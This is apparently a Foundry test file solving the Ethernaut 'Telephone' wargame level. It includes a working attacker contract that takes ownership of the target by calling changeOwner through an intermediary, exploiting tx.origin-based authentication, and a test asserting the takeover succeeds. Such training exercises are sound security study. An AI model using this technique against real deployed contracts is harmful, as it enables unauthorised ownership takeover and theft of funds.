// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Telephone} from "../../src/ethernaut/04.sol";

contract TelephoneAttacker {
    Telephone public telephoneContract;

    constructor(address _telephoneContract) {
        telephoneContract = Telephone(_telephoneContract);
    }

    function attack() public {
        telephoneContract.changeOwner(msg.sender);
    }
}

contract TelephoneTest is Test {
    Telephone public telephoneContract;
    TelephoneAttacker public telephoneAttackerContract;

    function setUp() public {
        telephoneContract = new Telephone();
        telephoneAttackerContract = new TelephoneAttacker(
            address(telephoneContract)
        );

        console.log(
            "TelephoneContract deployed at: ",
            address(telephoneContract)
        );
        console.log(
            "telephoneAttackerContract deployed at: ",
            address(telephoneAttackerContract)
        );
    }

    function testChangeOwner() public {
        console.log("Telephone owner: ", telephoneContract.owner());

        address attacker = vm.addr(1);
        vm.prank(attacker);
        console.log("Attacker address: ", attacker);
        telephoneAttackerContract.attack();

        console.log("New Telephone owner: ", telephoneContract.owner());
        assertEq(telephoneContract.owner(), attacker);
    }
}
